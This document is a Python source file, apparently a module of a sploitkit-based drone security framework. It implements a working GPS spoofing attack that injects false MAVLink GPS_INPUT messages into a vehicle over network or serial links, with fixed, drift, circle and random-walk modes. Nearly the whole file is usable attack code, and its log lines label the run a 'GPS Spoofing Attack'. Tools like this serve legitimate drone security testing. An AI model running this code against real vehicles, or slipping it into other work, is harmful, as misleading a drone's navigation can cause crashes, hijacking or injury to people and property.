from sploitkit import Config, Option
from lib.base import MAVLinkModule
from pymavlink import mavutil
import time
import math
import random
import signal

class GPSSpoofing(MAVLinkModule):
    """
    GPS Spoofing - Inject false GPS position data to mislead the vehicle about its location.

    Connection:
        Supports both network and serial connections:
        - Network: udp:192.168.1.1:14550 or tcp:192.168.1.1:5760
        - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)

    Usage:
        set connection udp:192.168.1.1:14550
        set mode fixed
        set latitude 37.7749
        set longitude -122.4194
        run
    """

    # Inherit connection config from base class and add module-specific options
    config = MAVLinkModule.config + Config({
        Option(
            name='mode',
            description='Spoofing mode: fixed, drift, circle, path, random',
            required=False,
        ): "fixed",  # Default value
        Option(
            name='latitude',
            description='Spoofed latitude in decimal degrees (e.g., 37.7749)',
            required=True,
        ): "37.7749",  # Default: San Francisco
        Option(
            name='longitude',
            description='Spoofed longitude in decimal degrees (e.g., -122.4194)',
            required=True,
        ): "-122.4194",  # Default: San Francisco
        Option(
            name='altitude',
            description='Spoofed altitude in meters above sea level',
            required=False,
        ): "100",  # Default value
        Option(
            name='duration',
            description='Duration to spoof in seconds (0 for infinite)',
            required=False,
        ): "60",  # Default value
        Option(
            name='update_rate',
            description='GPS update rate in Hz (messages per second)',
            required=False,
        ): "5",  # Default value
        Option(
            name='satellites',
            description='Number of spoofed GPS satellites visible',
            required=False,
        ): "12",  # Default value
        Option(
            name='fix_type',
            description='GPS fix type: 0=No Fix, 2=2D, 3=3D, 4=DGPS, 5=RTK',
            required=False,
        ): "3",  # Default: 3D fix
        Option(
            name='speed',
            description='Movement speed in m/s (for drift/circle/random modes)',
            required=False,
        ): "5",  # Default value
        Option(
            name='radius',
            description='Circle radius in meters (for circle mode)',
            required=False,
        ): "50",  # Default value
    })

    def send_gps_input(self, master, lat, lon, alt, satellites, fix_type):
        """
        Send spoofed GPS data using GPS_INPUT message.
        """
        # Convert to required units
        lat_int = int(lat * 1e7)  # Latitude in degrees * 1E7
        lon_int = int(lon * 1e7)  # Longitude in degrees * 1E7
        alt_msl = int(alt * 1000)  # Altitude in mm

        # Get current time in microseconds
        time_usec = int(time.time() * 1e6)

        # GPS_INPUT message parameters
        gps_id = 0
        ignore_flags = 0  # Don't ignore any fields
        time_week_ms = 0
        time_week = 0
        hdop = 100  # Horizontal dilution of precision in cm
        vdop = 100  # Vertical dilution of precision in cm
        vn = 0  # GPS velocity in m/s in NORTH direction
        ve = 0  # GPS velocity in m/s in EAST direction
        vd = 0  # GPS velocity in m/s in DOWN direction
        speed_accuracy = 50  # Speed accuracy estimate in cm/s
        horiz_accuracy = 100  # Horizontal accuracy estimate in cm
        vert_accuracy = 100  # Vertical accuracy estimate in cm

        master.mav.gps_input_send(
            time_usec,
            gps_id,
            ignore_flags,
            time_week_ms,
            time_week,
            fix_type,
            lat_int,
            lon_int,
            alt_msl,
            hdop,
            vdop,
            vn,
            ve,
            vd,
            speed_accuracy,
            horiz_accuracy,
            vert_accuracy,
            satellites
        )

    def calculate_new_position(self, lat, lon, bearing, distance):
        """
        Calculate new GPS position given bearing and distance.
        Uses Haversine formula.

        Args:
            lat: Current latitude in degrees
            lon: Current longitude in degrees
            bearing: Bearing in degrees (0-360)
            distance: Distance in meters

        Returns:
            (new_lat, new_lon) in degrees
        """
        R = 6371000  # Earth's radius in meters

        lat_rad = math.radians(lat)
        lon_rad = math.radians(lon)
        bearing_rad = math.radians(bearing)

        new_lat_rad = math.asin(
            math.sin(lat_rad) * math.cos(distance / R) +
            math.cos(lat_rad) * math.sin(distance / R) * math.cos(bearing_rad)
        )

        new_lon_rad = lon_rad + math.atan2(
            math.sin(bearing_rad) * math.sin(distance / R) * math.cos(lat_rad),
            math.cos(distance / R) - math.sin(lat_rad) * math.sin(new_lat_rad)
        )

        return math.degrees(new_lat_rad), math.degrees(new_lon_rad)

    def spoof_fixed(self, master, lat, lon, alt, satellites, fix_type, duration, update_rate):
        """
        Spoof GPS at a fixed position.
        """
        self.logger.info(f"Spoofing fixed position: {lat}, {lon}, {alt}m")

        interval = 1.0 / update_rate
        start_time = time.time()
        count = 0

        stop_spoofing = False

        def signal_handler(sig, frame):
            nonlocal stop_spoofing
            stop_spoofing = True

        original_sigint = signal.signal(signal.SIGINT, signal_handler)

        try:
            while not stop_spoofing:
                if duration > 0 and (time.time() - start_time) > duration:
                    break

                self.send_gps_input(master, lat, lon, alt, satellites, fix_type)
                count += 1

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Sent {count} spoofed GPS packets ({elapsed:.1f}s elapsed)")

                time.sleep(interval)

        finally:
            signal.signal(signal.SIGINT, original_sigint)

        self.logger.success(f"Sent total of {count} spoofed GPS packets")

    def spoof_drift(self, master, lat, lon, alt, satellites, fix_type, duration, update_rate, speed):
        """
        Spoof GPS with gradual drift in a random direction.
        """
        bearing = random.uniform(0, 360)
        self.logger.info(f"Spoofing drifting position: Starting at {lat}, {lon}, bearing {bearing:.1f}°")

        interval = 1.0 / update_rate
        start_time = time.time()
        count = 0

        current_lat = lat
        current_lon = lon

        stop_spoofing = False

        def signal_handler(sig, frame):
            nonlocal stop_spoofing
            stop_spoofing = True

        original_sigint = signal.signal(signal.SIGINT, signal_handler)

        try:
            while not stop_spoofing:
                if duration > 0 and (time.time() - start_time) > duration:
                    break

                self.send_gps_input(master, current_lat, current_lon, alt, satellites, fix_type)
                count += 1

                # Update position
                distance_per_update = speed / update_rate
                current_lat, current_lon = self.calculate_new_position(
                    current_lat, current_lon, bearing, distance_per_update
                )

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Position: {current_lat:.6f}, {current_lon:.6f} ({count} packets, {elapsed:.1f}s)")

                time.sleep(interval)

        finally:
            signal.signal(signal.SIGINT, original_sigint)

        self.logger.success(f"Final position: {current_lat:.6f}, {current_lon:.6f}")
        self.logger.success(f"Sent total of {count} spoofed GPS packets")

    def spoof_circle(self, master, lat, lon, alt, satellites, fix_type, duration, update_rate, speed, radius):
        """
        Spoof GPS moving in a circle around a center point.
        """
        self.logger.info(f"Spoofing circular path: Center {lat}, {lon}, radius {radius}m")

        interval = 1.0 / update_rate
        start_time = time.time()
        count = 0

        # Calculate angular velocity (radians per second)
        circumference = 2 * math.pi * radius
        angular_velocity = (speed / radius) if radius > 0 else 0

        angle = 0

        stop_spoofing = False

        def signal_handler(sig, frame):
            nonlocal stop_spoofing
            stop_spoofing = True

        original_sigint = signal.signal(signal.SIGINT, signal_handler)

        try:
            while not stop_spoofing:
                if duration > 0 and (time.time() - start_time) > duration:
                    break

                # Calculate position on circle
                current_lat, current_lon = self.calculate_new_position(
                    lat, lon, math.degrees(angle), radius
                )

                self.send_gps_input(master, current_lat, current_lon, alt, satellites, fix_type)
                count += 1

                # Update angle
                angle += angular_velocity / update_rate
                if angle > 2 * math.pi:
                    angle -= 2 * math.pi

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Position: {current_lat:.6f}, {current_lon:.6f} ({count} packets, {elapsed:.1f}s)")

                time.sleep(interval)

        finally:
            signal.signal(signal.SIGINT, original_sigint)

        self.logger.success(f"Sent total of {count} spoofed GPS packets")

    def spoof_random(self, master, lat, lon, alt, satellites, fix_type, duration, update_rate, speed):
        """
        Spoof GPS with random walk movement.
        """
        self.logger.info(f"Spoofing random walk: Starting at {lat}, {lon}")

        interval = 1.0 / update_rate
        start_time = time.time()
        count = 0

        current_lat = lat
        current_lon = lon
        bearing = random.uniform(0, 360)

        stop_spoofing = False

        def signal_handler(sig, frame):
            nonlocal stop_spoofing
            stop_spoofing = True

        original_sigint = signal.signal(signal.SIGINT, signal_handler)

        try:
            while not stop_spoofing:
                if duration > 0 and (time.time() - start_time) > duration:
                    break

                self.send_gps_input(master, current_lat, current_lon, alt, satellites, fix_type)
                count += 1

                # Update position with random bearing changes
                bearing += random.uniform(-30, 30)
                bearing = bearing % 360

                distance_per_update = speed / update_rate
                current_lat, current_lon = self.calculate_new_position(
                    current_lat, current_lon, bearing, distance_per_update
                )

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Position: {current_lat:.6f}, {current_lon:.6f} ({count} packets, {elapsed:.1f}s)")

                time.sleep(interval)

        finally:
            signal.signal(signal.SIGINT, original_sigint)

        self.logger.success(f"Final position: {current_lat:.6f}, {current_lon:.6f}")
        self.logger.success(f"Sent total of {count} spoofed GPS packets")

    def run(self):
        # Retrieve configuration options
        mode = self.config['mode'].lower()
        latitude = float(self.config['latitude'])
        longitude = float(self.config['longitude'])
        altitude = float(self.config['altitude'])
        duration = int(self.config['duration'])
        update_rate = int(self.config['update_rate'])
        satellites = int(self.config['satellites'])
        fix_type = int(self.config['fix_type'])
        speed = float(self.config['speed'])
        radius = float(self.config['radius'])

        separator = "=" * 80
        self.logger.info(separator)
        self.logger.info("GPS Spoofing Attack")
        self.logger.info(separator)
        self.logger.warning("This will inject false GPS data into the MAVLink stream")
        self.logger.info(f"Mode: {mode}")
        self.logger.info(f"Starting coordinates: {latitude}, {longitude}")
        self.logger.info(f"Altitude: {altitude}m")
        self.logger.info(f"GPS Fix Type: {fix_type}")
        self.logger.info(f"Satellites: {satellites}")
        self.logger.info(f"Update Rate: {update_rate} Hz")
        if duration > 0:
            self.logger.info(f"Duration: {duration} seconds")
        else:
            self.logger.info("Duration: Infinite (Ctrl+C to stop)")
        self.logger.info(separator)

        try:
            # Connect to the MAVLink device (supports both serial and network)
            master = self.connect_drone()

            # Execute spoofing based on mode
            if mode == "fixed":
                self.spoof_fixed(master, latitude, longitude, altitude, satellites, fix_type, duration, update_rate)

            elif mode == "drift":
                self.spoof_drift(master, latitude, longitude, altitude, satellites, fix_type, duration, update_rate, speed)

            elif mode == "circle":
                self.spoof_circle(master, latitude, longitude, altitude, satellites, fix_type, duration, update_rate, speed, radius)

            elif mode == "random":
                self.spoof_random(master, latitude, longitude, altitude, satellites, fix_type, duration, update_rate, speed)

            else:
                self.logger.error(f"Unknown mode: {mode}")
                self.logger.info("Supported modes: fixed, drift, circle, random")
                return

            self.logger.success(f"\n{separator}")
            self.logger.success("GPS Spoofing Attack Completed")
            self.logger.success(f"{separator}")

        except KeyboardInterrupt:
            self.logger.info("\n\nAttack interrupted by user.")
        except Exception as e:
            self.logger.error(f"Error during GPS spoofing: {str(e)}")
            import traceback
            self.logger.error(traceback.format_exc())
        finally:
            # Clean up connection
            self.close_connection(master)
